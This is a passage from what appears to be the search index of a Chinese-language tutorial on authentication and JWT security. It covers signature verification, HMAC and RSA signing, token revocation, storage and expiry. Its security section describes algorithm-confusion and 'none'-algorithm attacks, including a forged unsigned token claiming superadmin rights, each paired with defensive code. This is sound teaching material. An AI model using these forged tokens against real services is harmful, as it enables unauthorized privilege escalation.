= parts[2];\n\n    // 2. \u89e3\u7801Header\n    Header header = base64UrlDecode(encodedHeader);\n    String algorithm = header.getAlg();\n\n    // 3. \u9a8c\u8bc1\u7b7e\u540d\n    String data = encodedHeader + \".\" + encodedPayload;\n    String expectedSignature = sign(data, secret, algorithm);\n\n    if (!encodedSignature.equals(expectedSignature)) {\n        throw new InvalidTokenException(\"Invalid signature\");\n    }\n\n    // 4. \u89e3\u7801Payload\n    Payload payload = base64UrlDecode(encodedPayload);\n\n    // 5. \u9a8c\u8bc1Claims\n    long now = System.currentTimeMillis() / 1000;\n\n    // \u68c0\u67e5\u8fc7\u671f\u65f6\u95f4\n    if (payload.getExp() &lt; now) {\n        throw new TokenExpiredException(\"Token has expired\");\n    }\n\n    // \u68c0\u67e5\u751f\u6548\u65f6\u95f4\n    if (payload.getNbf() &gt; now) {\n        throw new TokenNotYetValidException(\"Token not yet valid\");\n    }\n\n    // \u68c0\u67e5\u53d7\u4f17\n    if (!payload.getAud().contains(expectedAudience)) {\n        throw new InvalidAudienceException(\"Invalid audience\");\n    }\n\n    // 6. \u8fd4\u56de\u7528\u6237\u4fe1\u606f\n    return new User(payload.getSub(), payload.getRoles());\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#24-jwt","title":"2.4 JWT\u7b7e\u540d\u7b97\u6cd5\u8be6\u89e3","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#hmac","title":"\u5bf9\u79f0\u7b7e\u540d\uff08HMAC\uff09","text":"<p>**\u539f\u7406\uff1a**\u4f7f\u7528\u540c\u4e00\u4e2a\u5bc6\u94a5\u8fdb\u884c\u7b7e\u540d\u548c\u9a8c\u8bc1</p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a - HS256\uff1aHMAC-SHA256\uff08\u63a8\u8350\uff0c\u6700\u5e38\u7528\uff09 - HS384\uff1aHMAC-SHA384 - HS512\uff1aHMAC-SHA512</p> <p>\u7b7e\u540d\u8fc7\u7a0b\uff1a <pre><code>\u7b7e\u540d\u65b9\u751f\u6210\uff1a\nsignature = HMACSHA256(data, secretKey)\n\n\u9a8c\u8bc1\u65b9\u9a8c\u8bc1\uff1a\nexpectedSignature = HMACSHA256(data, secretKey)\nvalid = (signature == expectedSignature)\n\n\u5173\u952e\uff1a\u7b7e\u540d\u65b9\u548c\u9a8c\u8bc1\u65b9\u4f7f\u7528\u76f8\u540c\u7684secretKey\n</code></pre></p> <p>\u5bc6\u94a5\u8981\u6c42\uff1a <pre><code>HS256: \u81f3\u5c11256\u4f4d\uff0832\u5b57\u8282\uff09\nHS384: \u81f3\u5c11384\u4f4d\uff0848\u5b57\u8282\uff09\nHS512: \u81f3\u5c11512\u4f4d\uff0864\u5b57\u8282\uff09\n\n\u751f\u6210\u5f3a\u5bc6\u94a5\uff1a\nopenssl rand -base64 64\n</code></pre></p> <p>\u4f18\u70b9\uff1a - \u2705 \u6027\u80fd\u9ad8\uff08\u6bd4\u975e\u5bf9\u79f0\u5feb10-100\u500d\uff09 - \u2705 \u5b9e\u73b0\u7b80\u5355 - \u2705 \u5bc6\u94a5\u7ba1\u7406\u76f8\u5bf9\u7b80\u5355</p> <p>\u7f3a\u70b9\uff1a - \u274c \u9700\u8981\u5171\u4eab\u5bc6\u94a5\uff08\u6240\u6709\u670d\u52a1\u5668\u90fd\u6709\u5bc6\u94a5\uff09 - \u274c \u5bc6\u94a5\u6cc4\u9732\u98ce\u9669\u9ad8 - \u274c \u4e0d\u9002\u5408\u591a\u65b9\u9a8c\u8bc1\u573a\u666f</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u5355\u4f53\u5e94\u7528\u6216\u540c\u4e00\u7ec4\u7ec7\u5185\u7684\u5fae\u670d\u52a1 - \u8ba4\u8bc1\u670d\u52a1\u5668\u548c\u8d44\u6e90\u670d\u52a1\u5668\u5728\u540c\u4e00\u4fe1\u4efb\u57df</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#rsaecdsa","title":"\u975e\u5bf9\u79f0\u7b7e\u540d\uff08RSA/ECDSA\uff09","text":"<p>**\u539f\u7406\uff1a**\u4f7f\u7528\u79c1\u94a5\u7b7e\u540d\uff0c\u516c\u94a5\u9a8c\u8bc1</p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a - RS256\uff1aRSA-SHA256\uff08\u6700\u5e38\u7528\uff09 - RS384\uff1aRSA-SHA384 - RS512\uff1aRSA-SHA512 - ES256\uff1aECDSA-SHA256\uff08\u66f4\u77ed\u7684\u5bc6\u94a5\uff0c\u76f8\u540c\u5b89\u5168\u6027\uff09</p> <p>\u7b7e\u540d\u8fc7\u7a0b\uff1a <pre><code>\u8ba4\u8bc1\u670d\u52a1\u5668\uff08\u6301\u6709\u79c1\u94a5\uff09\uff1a\nsignature = RSA_Sign(data, privateKey)\n\n\u8d44\u6e90\u670d\u52a1\u5668\uff08\u6301\u6709\u516c\u94a5\uff09\uff1a\nvalid = RSA_Verify(data, signature, publicKey)\n\n\u5173\u952e\uff1a\u79c1\u94a5\u7b7e\u540d\uff0c\u516c\u94a5\u9a8c\u8bc1\uff0c\u516c\u94a5\u53ef\u4ee5\u516c\u5f00\u5206\u53d1\n</code></pre></p> <p>\u5bc6\u94a5\u5bf9\u751f\u6210\uff1a <pre><code># \u751f\u6210RS256\u5bc6\u94a5\u5bf9\nopenssl genrsa -out private_key.pem 2048\nopenssl rsa -in private_key.pem -pubout -out public_key.pem\n\n# \u751f\u6210ES256\u5bc6\u94a5\u5bf9\uff08ECDSA\uff09\nopenssl ecparam -genkey -name prime256v1 -noout -out ec_private_key.pem\nopenssl ec -in ec_private_key.pem -pubout -out ec_public_key.pem\n</code></pre></p> <p>\u4f18\u70b9\uff1a - \u2705 \u79c1\u94a5\u53ea\u5728\u8ba4\u8bc1\u670d\u52a1\u5668\uff0c\u5b89\u5168\u6027\u9ad8 - \u2705 \u516c\u94a5\u53ef\u4ee5\u5206\u53d1\u7ed9\u6240\u6709\u8d44\u6e90\u670d\u52a1\u5668 - \u2705 \u9002\u5408\u591a\u65b9\u9a8c\u8bc1 - \u2705 \u652f\u6301\u5bc6\u94a5\u8f6e\u6362</p> <p>\u7f3a\u70b9\uff1a - \u274c \u6027\u80fd\u8f83\u4f4e\uff08\u6bd4HMAC\u616210-100\u500d\uff09 - \u274c \u5b9e\u73b0\u590d\u6742 - \u274c \u5bc6\u94a5\u7ba1\u7406\u590d\u6742\uff08\u9700\u8981PKI\uff09</p> <p>\u9002\u7528\u573a\u666f\uff1a - \u5fae\u670d\u52a1\u67b6\u6784\uff08\u591a\u4e2a\u8d44\u6e90\u670d\u52a1\u5668\uff09 - \u7b2c\u4e09\u65b9API\u8bbf\u95ee - \u9700\u8981\u516c\u5f00\u9a8c\u8bc1Token\u7684\u573a\u666f</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_9","title":"\u7b97\u6cd5\u9009\u62e9\u5efa\u8bae","text":"<pre><code>\u573a\u666f1\uff1a\u5355\u4f53\u5e94\u7528\u6216\u5185\u90e8\u5fae\u670d\u52a1\n\u63a8\u8350\uff1aHS256\n\u7406\u7531\uff1a\u6027\u80fd\u9ad8\uff0c\u5b9e\u73b0\u7b80\u5355\uff0c\u5bc6\u94a5\u7ba1\u7406\u5bb9\u6613\n\n\u573a\u666f2\uff1a\u591a\u79df\u6237SaaS\u5e73\u53f0\n\u63a8\u8350\uff1aRS256\n\u7406\u7531\uff1a\u6bcf\u4e2a\u79df\u6237\u53ef\u4ee5\u6709\u72ec\u7acb\u7684\u5bc6\u94a5\u5bf9\uff0c\u516c\u94a5\u5206\u53d1\n\n\u573a\u666f3\uff1a\u79fb\u52a8\u5e94\u7528 + \u540e\u7aefAPI\n\u63a8\u8350\uff1aRS256\n\u7406\u7531\uff1a\u516c\u94a5\u53ef\u4ee5\u5185\u7f6e\u5728\u79fb\u52a8\u5e94\u7528\u4e2d\u9a8c\u8bc1\n\n\u573a\u666f4\uff1a\u5bf9\u6027\u80fd\u8981\u6c42\u6781\u9ad8\n\u63a8\u8350\uff1aES256\uff08ECDSA\uff09\n\u7406\u7531\uff1a\u6bd4RSA\u66f4\u5feb\uff0c\u5bc6\u94a5\u66f4\u77ed\uff0c\u5b89\u5168\u6027\u76f8\u540c\n\n\u26a0\ufe0f \u907f\u514d\u4f7f\u7528 alg: \"none\"\uff08\u65e0\u7b7e\u540d\uff09\uff0c\u5b58\u5728\u5b89\u5168\u98ce\u9669\uff01\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#25-jwt","title":"2.5 JWT\u5b89\u5168\u6027\u6df1\u5165","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_10","title":"\u5e38\u89c1\u5b89\u5168\u95ee\u9898","text":"<p>\u95ee\u98981\uff1a\u7b97\u6cd5\u6df7\u6dc6\u653b\u51fb\uff08Algorithm Confusion\uff09</p> <p>\u653b\u51fb\u539f\u7406\uff1a <pre><code>1. \u653b\u51fb\u8005\u83b7\u53d6\u516c\u94a5\uff08\u516c\u94a5\u662f\u516c\u5f00\u7684\uff09\n2. \u4fee\u6539Header\uff1aalg: \"RS256\" \u2192 \"HS256\"\n3. \u4f7f\u7528\u516c\u94a5\u4f5c\u4e3aHMAC\u5bc6\u94a5\u7b7e\u540dToken\n4. \u670d\u52a1\u5668\u7528\u516c\u94a5\u9a8c\u8bc1HMAC\u7b7e\u540d \u2192 \u901a\u8fc7\uff01\n</code></pre></p> <p>\u653b\u51fb\u793a\u4f8b\uff1a <pre><code>// \u539f\u59cbToken\uff08RS256\uff09\nHeader:  {\"alg\": \"RS256\", \"typ\": \"JWT\"}\nPayload: {\"sub\": \"user123\", \"role\": \"user\"}\nSignature: [RS256\u7b7e\u540d]\n\n// \u653b\u51fb\u540e\u7684Token\uff08\u6539\u4e3aHS256\uff09\nHeader:  {\"alg\": \"HS256\", \"typ\": \"JWT\"}\nPayload: {\"sub\": \"user123\", \"role\": \"admin\"}  // \u63d0\u5347\u6743\u9650\uff01\nSignature: HMAC(data, publicKey)  // \u7528\u516c\u94a5\u4f5c\u4e3a\u5bc6\u94a5\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>// \u274c \u9519\u8bef\uff1a\u4fe1\u4efbHeader\u4e2d\u7684\u7b97\u6cd5\npublic boolean validateToken(String jwt) {\n    Header header = parseHeader(jwt);\n    String alg = header.getAlg();  // \u4eceToken\u4e2d\u8bfb\u53d6\n    return verify(jwt, alg);       // \u5371\u9669\uff01\n}\n\n// \u2705 \u6b63\u786e\uff1a\u5f3a\u5236\u6307\u5b9a\u7b97\u6cd5\npublic boolean validateToken(String jwt) {\n    final String EXPECTED_ALG = \"RS256\";  // \u786c\u7f16\u7801\n    Header header = parseHeader(jwt);\n\n    if (!EXPECTED_ALG.equals(header.getAlg())) {\n        throw new SecurityException(\"Algorithm not allowed\");\n    }\n\n    return verify(jwt, EXPECTED_ALG);\n}\n</code></pre></p> <p>\u95ee\u98982\uff1aNone\u7b97\u6cd5\u653b\u51fb</p> <p>\u653b\u51fb\u539f\u7406\uff1a <pre><code>// \u653b\u51fb\u8005\u4fee\u6539Header\n{\n  \"alg\": \"none\",  // \u65e0\u7b7e\u540d\uff01\n  \"typ\": \"JWT\"\n}\n\n// \u4f2a\u9020\u7684Payload\n{\n  \"sub\": \"admin\",\n  \"role\": \"superadmin\"\n}\n\n// Token\u683c\u5f0f\uff1aHeader.Payload.\uff08\u7b7e\u540d\u4e3a\u7a7a\uff09\neyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJzdXBlcmFkbWluIn0.\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>// \u2705 \u62d2\u7eddnone\u7b97\u6cd5\npublic boolean validateToken(String jwt) {\n    Header header = parseHeader(jwt);\n\n    if (\"none\".equalsIgnoreCase(header.getAlg())) {\n        throw new SecurityException(\"Unsigned JWT not allowed\");\n    }\n\n    return verify(jwt);\n}\n</code></pre></p> <p>\u95ee\u98983\uff1a\u5bc6\u94a5\u6cc4\u9732</p> <p>\u98ce\u9669\u573a\u666f\uff1a - \u5bc6\u94a5\u786c\u7f16\u7801\u5728\u6e90\u4ee3\u7801\u4e2d - \u5bc6\u94a5\u63d0\u4ea4\u5230Git\u4ed3\u5e93 - \u5bc6\u94a5\u901a\u8fc7\u65e5\u5fd7\u6cc4\u9732 - \u5bc6\u94a5\u6743\u9650\u7ba1\u7406\u4e0d\u5f53</p> <p>\u6700\u4f73\u5b9e\u8df5\uff1a <pre><code>// \u274c \u9519\u8bef\uff1a\u786c\u7f16\u7801\u5bc6\u94a5\nprivate static final String SECRET = \"my-secret-key-123\";\n\n// \u2705 \u6b63\u786e\uff1a\u4ece\u73af\u5883\u53d8\u91cf\u8bfb\u53d6\nprivate final String secret = System.getenv(\"JWT_SECRET\");\n\n// \u2705 \u66f4\u597d\uff1a\u4ece\u5bc6\u94a5\u7ba1\u7406\u670d\u52a1\u8bfb\u53d6\nprivate final String secret = keyManagementService.getSecret(\"jwt-secret\");\n\n// \u2705 \u6700\u4f73\uff1a\u5b9a\u671f\u8f6e\u6362\u5bc6\u94a5\npublic class KeyRotationService {\n    private Map&lt;String, SecretKey&gt; keys = new HashMap&lt;&gt;();\n    private String currentKeyId = \"key-2024-01\";\n\n    public String sign(String data) {\n        SecretKey key = keys.get(currentKeyId);\n        return HMAC(data, key);\n    }\n\n    public boolean verify(String data, String signature, String keyId) {\n        SecretKey key = keys.get(keyId);  // \u652f\u6301\u65e7\u5bc6\u94a5\u9a8c\u8bc1\n        return HMAC(data, key).equals(signature);\n    }\n}\n</code></pre></p> <p>\u95ee\u98984\uff1aToken\u88ab\u7a83\u53d6</p> <p>\u653b\u51fb\u573a\u666f\uff1a - XSS\u653b\u51fb\u7a83\u53d6localStorage\u4e2d\u7684Token - \u4e2d\u95f4\u4eba\u653b\u51fb\u62e6\u622aHTTP\u4f20\u8f93 - \u6076\u610f\u8f6f\u4ef6\u7a83\u53d6</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>1. \u4f7f\u7528HTTPS\uff08\u9632\u4e2d\u95f4\u4eba\uff09\n   \u2705 \u6240\u6709API\u5fc5\u987bHTTPS\n   \u2705 \u542f\u7528HSTS\u5934\n\n2. HttpOnly Cookie\u5b58\u50a8\uff08\u9632XSS\uff09\n   \u2705 Token\u5b58\u50a8\u5728HttpOnly Cookie\u4e2d\n   \u274c \u4e0d\u8981\u5b58\u50a8\u5728localStorage\n\n3. \u77ed\u671fToken + Refresh Token\n   \u2705 Access Token: 15\u5206\u949f\n   \u2705 Refresh Token: 7\u5929\uff0c\u5b58\u50a8\u5728\u5b89\u5168Cookie\n\n4. Token Binding\uff08\u9ad8\u7ea7\uff09\n   \u2705 \u5c06Token\u7ed1\u5b9a\u5230TLS\u8fde\u63a5\n   \u2705 \u9632\u6b62Token\u88ab\u590d\u5236\u4f7f\u7528\n</code></pre></p> <p>\u95ee\u98985\uff1a\u91cd\u653e\u653b\u51fb\uff08Replay Attack\uff09</p> <p>\u653b\u51fb\u539f\u7406\uff1a <pre><code>1. \u653b\u51fb\u8005\u622a\u83b7\u6709\u6548\u7684JWT\n2. \u5728Token\u8fc7\u671f\u524d\u91cd\u590d\u4f7f\u7528\n3. \u5373\u4f7f\u7528\u6237\u5df2\u767b\u51fa\uff0cToken\u4ecd\u7136\u6709\u6548\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>// \u65b9\u68481\uff1a\u4f7f\u7528jti\uff08JWT ID\uff09+ \u9ed1\u540d\u5355\npublic boolean validateToken(String jwt) {\n    Claims claims = parseToken(jwt);\n    String jti = claims.getJti();\n\n    // \u68c0\u67e5\u662f\u5426\u5728\u9ed1\u540d\u5355\u4e2d\n    if (blacklist.contains(jti)) {\n        throw new TokenRevokedException();\n    }\n\n    return true;\n}\n\n// \u767b\u51fa\u65f6\u5c06jti\u52a0\u5165\u9ed1\u540d\u5355\npublic void logout(String jwt) {\n    Claims claims = parseToken(jwt);\n    String jti = claims.getJti();\n    long exp = claims.getExp();\n\n    // \u6dfb\u52a0\u5230\u9ed1\u540d\u5355\uff0c\u8bbe\u7f6eTTL\u4e3aToken\u5269\u4f59\u65f6\u95f4\n    long ttl = exp - (System.currentTimeMillis() / 1000);\n    blacklist.add(jti, ttl);\n}\n\n// \u65b9\u68482\uff1a\u4f7f\u7528nonce\uff08\u4e00\u6b21\u6027\u968f\u673a\u6570\uff09\n{\n  \"jti\": \"unique-id-123\",\n  \"nonce\": \"random-nonce-xyz\",\n  \"iat\": 1735686000\n}\n\n// \u65b9\u68483\uff1a\u77ed\u671fToken\uff08\u6700\u7b80\u5355\uff09\n// Access Token: 5-15\u5206\u949f\n// \u5373\u4f7f\u88ab\u7a83\u53d6\uff0c\u5f71\u54cd\u65f6\u95f4\u4e5f\u5f88\u77ed\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#token","title":"Token\u64a4\u9500\u7b56\u7565","text":"<p>**\u95ee\u9898\uff1a**JWT\u65e0\u72b6\u6001\u7684\u7279\u6027\u5bfc\u81f4\u65e0\u6cd5\u4e3b\u52a8\u64a4\u9500</p> <p>\u89e3\u51b3\u65b9\u6848\u5bf9\u6bd4\uff1a</p> \u65b9\u6848 \u5b9e\u73b0\u65b9\u5f0f \u4f18\u70b9 \u7f3a\u70b9 \u9002\u7528\u573a\u666f \u9ed1\u540d\u5355 Redis\u5b58\u50a8\u5df2\u64a4\u9500\u7684jti \u7cbe\u786e\u63a7\u5236 \u5931\u53bb\u65e0\u72b6\u6001\u4f18\u52bf \u4e2d\u7b49\u5b89\u5168\u8981\u6c42 \u767d\u540d\u5355 Redis\u5b58\u50a8\u6709\u6548\u7684jti \u5b89\u5168\u6027\u6700\u9ad8 \u7c7b\u4f3cSession\uff0c\u5931\u53bbJWT\u4f18\u52bf \u9ad8\u5b89\u5168\u8981\u6c42 \u77ed\u671fToken \u8bbe\u7f6e\u77ed\u8fc7\u671f\u65f6\u95f4 \u4fdd\u6301\u65e0\u72b6\u6001 \u7528\u6237\u4f53\u9a8c\u5dee\uff08\u9891\u7e41\u5237\u65b0\uff09 \u4f4e\u5b89\u5168\u8981\u6c42 Refresh Token Access Token\u77ed\u671f + Refresh Token\u957f\u671f \u5e73\u8861\u5b89\u5168\u548c\u4f53\u9a8c \u5b9e\u73b0\u590d\u6742 \u63a8\u8350\u65b9\u6848 \u7248\u672c\u53f7 Payload\u4e2d\u5b58\u50a8tokenVersion \u7b80\u5355 \u9700\u8981\u67e5\u8be2\u6570\u636e\u5e93 \u7b80\u5355\u573a\u666f <p>\u63a8\u8350\u65b9\u6848\uff1aAccess Token + Refresh Token</p> <pre><code>\u67b6\u6784\u8bbe\u8ba1\uff1a\n\nAccess Token\uff08\u8bbf\u95ee\u4ee4\u724c\uff09\uff1a\n- \u7528\u9014\uff1a\u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90\n- \u6709\u6548\u671f\uff1a\u77ed\uff085-15\u5206\u949f\uff09\n- \u5b58\u50a8\u4f4d\u7f6e\uff1a\u5185\u5b58\u6216HttpOnly Cookie\n- \u662f\u5426\u53ef\u64a4\u9500\uff1a\u4e0d\u53ef\uff08\u4f46\u5f88\u5feb\u8fc7\u671f\uff09\n\nRefresh Token\uff08\u5237\u65b0\u4ee4\u724c\uff09\uff1a\n- \u7528\u9014\uff1a\u83b7\u53d6\u65b0\u7684Access Token\n- \u6709\u6548\u671f\uff1a\u957f\uff087-30\u5929\uff09\n- \u5b58\u50a8\u4f4d\u7f6e\uff1aHttpOnly Cookie\u6216\u5b89\u5168\u5b58\u50a8\n- \u662f\u5426\u53ef\u64a4\u9500\uff1a\u53ef\u4ee5\uff08\u5b58\u50a8\u5728\u6570\u636e\u5e93\uff09\n\n\u6d41\u7a0b\uff1a\n1. \u767b\u5f55 \u2192 \u8fd4\u56deAccess Token + Refresh Token\n2. \u8bbf\u95eeAPI \u2192 \u4f7f\u7528Access Token\n3. Access Token\u8fc7\u671f \u2192 \u4f7f\u7528Refresh Token\u83b7\u53d6\u65b0\u7684Access Token\n4. Refresh Token\u8fc7\u671f \u2192 \u91cd\u65b0\u767b\u5f55\n5. \u767b\u51fa \u2192 \u64a4\u9500Refresh Token\uff08\u6570\u636e\u5e93\u5220\u9664\uff09\n</code></pre> <p>\u5b9e\u73b0\u793a\u4f8b\uff1a <pre><code>/**\n * Token\u5237\u65b0\u6d41\u7a0b\n */\npublic TokenPair refreshToken(String refreshToken) {\n    // 1. \u9a8c\u8bc1Refresh Token\n    Claims claims = jwtService.validateToken(refreshToken);\n    String userId = claims.getSubject();\n    String tokenId = claims.getJti();\n\n    // 2. \u68c0\u67e5Refresh Token\u662f\u5426\u5728\u6570\u636e\u5e93\u4e2d\uff08\u672a\u88ab\u64a4\u9500\uff09\n    RefreshTokenEntity entity = refreshTokenRepository\n        .findByUserIdAndTokenId(userId, tokenId);\n\n    if (entity == null || entity.isRevoked()) {\n        throw new InvalidRefreshTokenException();\n    }\n\n    // 3. \u751f\u6210\u65b0\u7684Access Token\uff08\u77ed\u671f\uff09\n    String newAccessToken = jwtService.generateAccessToken(\n        userId, \n        Duration.ofMinutes(15)\n    );\n\n    // 4. \u53ef\u9009\uff1a\u8f6e\u6362Refresh Token\uff08\u66f4\u5b89\u5168\uff09\n    String newRefreshToken = jwtService.generateRefreshToken(\n        userId,\n        Duration.ofDays(7)\n    );\n\n    // \u64a4\u9500\u65e7Refresh Token\n    entity.setRevoked(true);\n    refreshTokenRepository.save(entity);\n\n    // \u4fdd\u5b58\u65b0Refresh Token\n    saveNewRefreshToken(userId, newRefreshToken);\n\n    // 5. \u8fd4\u56de\u65b0Token\u5bf9\n    return new TokenPair(newAccessToken, newRefreshToken);\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#26-jwt","title":"2.6 JWT\u6700\u4f73\u5b9e\u8df5","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1-token","title":"1. Token\u5b58\u50a8\u4f4d\u7f6e\u9009\u62e9","text":"<p>\u9009\u9879\u5bf9\u6bd4\uff1a</p> \u5b58\u50a8\u4f4d\u7f6e \u5b89\u5168\u6027 XSS\u98ce\u9669 CSRF\u98ce\u9669 \u9002\u7528\u573a\u666f localStorage \u4f4e \u9ad8\uff08\u6613\u88abXSS\u7a83\u53d6\uff09 \u65e0 \u4e0d\u63a8\u8350 sessionStorage \u4f4e \u9ad8\uff08\u6613\u88abXSS\u7a83\u53d6\uff09 \u65e0 \u4e34\u65f6Token HttpOnly Cookie \u9ad8 \u4f4e\uff08JavaScript\u65e0\u6cd5\u8bbf\u95ee\uff09 \u6709\uff08\u9700CSRF\u9632\u62a4\uff09 \u63a8\u8350 \u5185\u5b58\u53d8\u91cf \u6700\u9ad8 \u65e0 \u65e0 SPA\u5e94\u7528 <p>\u63a8\u8350\u65b9\u6848\uff1aHttpOnly Cookie + SameSite</p> <pre><code>// \u670d\u52a1\u5668\u7aef\u8bbe\u7f6eCookie\npublic void setTokenCookie(HttpServletResponse response, String token) {\n    Cookie cookie = new Cookie(\"access_token\", token);\n\n    // \u5b89\u5168\u914d\u7f6e\n    cookie.setHttpOnly(true);              // \u9632\u6b62JavaScript\u8bbf\u95ee\n    cookie.setSecure(true);                // \u4ec5HTTPS\u4f20\u8f93\n    cookie.setSameSite(\"Strict\");          // \u9632\u6b62CSRF\n    cookie.setPath(\"/\");                   // \u5168\u7ad9\u6709\u6548\n    cookie.setMaxAge(15 * 60);             // 15\u5206\u949f\n\n    response.addCookie(cookie);\n}\n\n// \u5ba2\u6237\u7aef\u81ea\u52a8\u643a\u5e26Cookie\n// \u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u5728\u8bf7\u6c42\u4e2d\u5305\u542bCookie\uff0c\u65e0\u9700JavaScript\u64cd\u4f5c\n</code></pre> <p>SPA\u5e94\u7528\u65b9\u6848\uff1a\u5185\u5b58\u5b58\u50a8 + \u81ea\u52a8\u5237\u65b0</p> <pre><code>// \u5ba2\u6237\u7aef\u4ee3\u7801\nclass TokenManager {\n    constructor() {\n        this.accessToken = null;  // \u5185\u5b58\u5b58\u50a8\n        this.refreshTimer = null;\n    }\n\n    // \u767b\u5f55\u540e\u4fdd\u5b58Token\n    setToken(accessToken, expiresIn) {\n        this.accessToken = accessToken;\n\n        // \u5728Token\u8fc7\u671f\u524d5\u5206\u949f\u81ea\u52a8\u5237\u65b0\n        const refreshTime = (expiresIn - 300) * 1000;\n        this.refreshTimer = setTimeout(() =&gt; {\n            this.refreshAccessToken();\n        }, refreshTime);\n    }\n\n    // \u83b7\u53d6Token\n    getToken() {\n        return this.accessToken;\n    }\n\n    // \u5237\u65b0Token\n    async refreshAccessToken() {\n        const response = await fetch('/api/auth/refresh', {\n            method: 'POST',\n            credentials: 'include'  // \u643a\u5e26Refresh Token Cookie\n        });\n\n        const { access_token, expires_in } = await response.json();\n        this.setToken(access_token, expires_in);\n    }\n\n    // \u767b\u51fa\u65f6\u6e05\u9664\n    clearToken() {\n        this.accessToken = null;\n        if (this.refreshTimer) {\n            clearTimeout(this.refreshTimer);\n        }\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-token","title":"2. Token\u8fc7\u671f\u65f6\u95f4\u8bbe\u7f6e","text":"<p>\u63a8\u8350\u914d\u7f6e\uff1a</p> <pre><code>Access Token\uff08\u8bbf\u95ee\u4ee4\u724c\uff09\uff1a\n- \u79fb\u52a8APP\uff1a60\u5206\u949f\n- Web\u5e94\u7528\uff08SPA\uff09\uff1a15\u5206\u949f\n- \u540e\u53f0\u670d\u52a1\u8c03\u7528\uff1a5\u5206\u949f\n- \u9ad8\u5b89\u5168\u573a\u666f\uff08\u94f6\u884c\uff09\uff1a5\u5206\u949f\n\nRefresh Token\uff08\u5237\u65b0\u4ee4\u724c\uff09\uff1a\n- \u79fb\u52a8APP\uff1a30-90\u5929\n- Web\u5e94\u7528\uff1a7-14\u5929\n- \u9ad8\u5b89\u5168\u573a\u666f\uff1a1-3\u5929\n\n\u539f\u5219\uff1a\n- Access Token\u8d8a\u77ed\u8d8a\u5b89\u5168\uff0c\u4f46\u5237\u65b0\u9891\u7387\u8d8a\u9ad8\n- Refresh Token\u8d8a\u957f\u7528\u6237\u4f53\u9a8c\u8d8a\u597d\uff0c\u4f46\u98ce\u9669\u8d8a\u9ad8\n- \u6839\u636e\u5b9e\u9645\u573a\u666f\u6743\u8861\n</code></pre> <p>\u5b9e\u73b0\u793a\u4f8b\uff1a <pre><code>public class JWTConfig {\n    // Access Token\u914d\u7f6e\n    public static final Duration ACCESS_TOKEN_VALIDITY = Duration.ofMinutes(15);\n\n    // Refresh Token\u914d\u7f6e\n    public static final Duration REFRESH_TOKEN_VALIDITY = Duration.ofDays(7);\n\n    // \u5237\u65b0\u7a97\u53e3\uff08\u5728\u8fc7\u671f\u524d\u591a\u4e45\u53ef\u4ee5\u5237\u65b0\uff09\n    public static final Duration REFRESH_WINDOW = Duration.ofMinutes(5);\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-claims","title":"3. Claims\u8bbe\u8ba1\u539f\u5219","text":"<p>\u2705 \u5e94\u8be5\u5305\u542b\u7684Claims\uff1a <pre><code>{\n  \"sub\": \"user-123\",              // \u7528\u6237ID\uff08\u5fc5\u9700\uff09\n  \"iss\": \"https://auth.example.com\",  // \u7b7e\u53d1\u8005\n  \"aud\": \"https://api.example.com\",   // \u53d7\u4f17\n  \"exp\": 1735689600,              // \u8fc7\u671f\u65f6\u95f4\uff08\u5fc5\u9700\uff09\n  \"iat\": 1735686000,              // \u7b7e\u53d1\u65f6\u95f4\n  \"jti\": \"token-uuid-123\",        // Token\u552f\u4e00ID\uff08\u7528\u4e8e\u64a4\u9500\uff09\n  \"roles\": [\"user\", \"admin\"],     // \u89d2\u8272\uff08\u7528\u4e8e\u6743\u9650\u63a7\u5236\uff09\n  \"permissions\": [\"read\", \"write\"], // \u6743\u9650\n  \"type\": \"access\"                // Token\u7c7b\u578b\n}\n</code></pre></p> <p>\u274c \u4e0d\u5e94\u8be5\u5305\u542b\u7684\u4fe1\u606f\uff1a <pre><code>{\n  \"password\": \"xxx\",              // \u274c \u5bc6\u7801\n  \"creditCard\": \"1234-5678\",      // \u274c \u654f\u611f\u4fe1\u606f\n  \"ssn\": \"123-45-6789\",           // \u274c \u8eab\u4efd\u8bc1\u53f7\n  \"privateKey\": \"xxx\"             // \u274c \u5bc6\u94a5\n}\n</code></pre></p> <p>\u8bbe\u8ba1\u539f\u5219\uff1a <pre><code>1. \u6700\u5c0f\u5316\u539f\u5219\n   - \u53ea\u5305\u542b\u5fc5\u8981\u4fe1\u606f\n   - Token\u8d8a\u5c0f\u6027\u80fd\u8d8a\u597d\n\n2. 